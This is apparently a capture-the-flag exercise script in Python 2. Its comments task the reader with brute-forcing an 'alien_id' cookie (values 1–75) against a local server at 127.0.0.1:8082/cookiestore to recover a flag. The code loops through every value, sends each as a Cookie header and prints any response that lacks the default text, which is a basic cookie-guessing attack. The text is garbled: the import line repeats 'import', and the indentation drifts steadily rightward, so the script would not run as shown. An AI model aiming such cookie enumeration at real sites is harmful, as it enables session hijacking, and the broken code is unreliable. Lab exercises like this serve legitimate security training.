#
# Write a script that can guess cookie values
# and send them to the url http://127.0.0.1:8082/cookiestore
# Read the response from the right cookie value to get the flag.
# The cookie id the aliens are using is alien_id
# we believe the id is a number between 1 and 75
#
# Note: The script can timeout if this occurs try narrowing
# down your search
#

import urllib2
import re

from HTMLParser import import HTMLParser

values = [str(i) for i in range(1, 76)]

class MyHTMLParser(HTMLParser):
      def __init__(self):
              self.reset()
                  self.HTMLDATA = []

                    def handle_data(self, data):
                            data = data.strip()
                                data = re.sub('\W', '', data)
                                    data = re.sub('[_]', '', data)

                                        if data:
                                                  self.HTMLDATA.append(data)
                                                      

                                                      for value in values:
                                                              url = 'http://127.0.0.1:8082/cookiestore'
                                                                  
                                                                      request = urllib2.Request(url)
                                                                          request.add_header('Cookie', 'alien_id={}'.format(value))
                                                                              response = urllib2.urlopen(request)
                                                                                  contents = response.read()
                                                                                      
                                                                                          parser = MyHTMLParser()
                                                                                              parser.feed(contents)
                                                                                                  key = parser.HTMLDATA[-1]
                                                                                                      
                                                                                                          if 'Givemecookie' not in key:
                                                                                                                        print(key)
